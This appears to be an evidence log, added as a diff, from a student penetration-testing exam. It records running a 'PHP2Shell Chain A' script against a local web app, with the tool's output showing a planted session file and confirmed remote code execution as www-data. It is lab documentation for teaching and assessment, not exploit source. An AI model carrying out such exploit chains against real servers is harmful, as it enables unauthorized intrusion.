@@ -1,0 +1,19 @@
+=== EV-W2-07 · PHP2Shell Chain A RCE desde M1 ===
+Host: kali · Fecha UTC: 2026-10-27T21:10:38Z
+Comando:
+./informe/tools/chain-a.sh
+----------------------------------------------------------------------
+[*] Target: http://127.0.0.1:80
+[*] Command: id; hostname
+
+[attempt 1] SID=exploit74e7ef91eae64b05b93b file=/tmp/sess_exploit74e7ef91eae64b05b93b
+    plant=stalled
+[+] RCE CONFIRMED: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+7
+m1-app
+
+7b
+----------------------------------------------------------------------
+[exit=0] · Evidencia: /home/kali/IS-EXAMEN-UNIDAD-1/informe/evidencias/png/EV-W2-07.png
+Cierre UTC: 2026-10-27T21:10:40Z
